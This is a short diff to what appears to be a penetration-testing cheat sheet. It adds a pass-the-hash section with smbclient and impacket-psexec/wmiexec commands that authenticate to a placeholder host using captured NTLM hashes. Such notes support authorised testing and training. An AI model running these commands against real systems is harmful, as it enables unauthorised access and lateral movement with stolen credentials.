@@ -229,6 +229,12 @@ windows-auth uses NTLM
 ### MySQL login
 	mysql -u user -p'pass' -h 123.123.123.123 -P 3306 --skip-ssl-verify-server-cert
 
+### Pass the Hash
+	smbclient //123.123.123.123/share -U Administrator --pw-nt-hash <hash>
+
+	impacket-psexec -hashes <LM hash>:<NT hash> Administrator@123.123.123.123
+if `LM hash` is unused, fill it with `00000000000000000000000000000000`.  Same format for `impacket-wmiexec`
+
 # STAGE 3 - PRIVILEGE ESCALATION
 ## Weakness Enumeration (Linpeas/Winpeas)
 From attacker, `cd` to directory of enumerator  
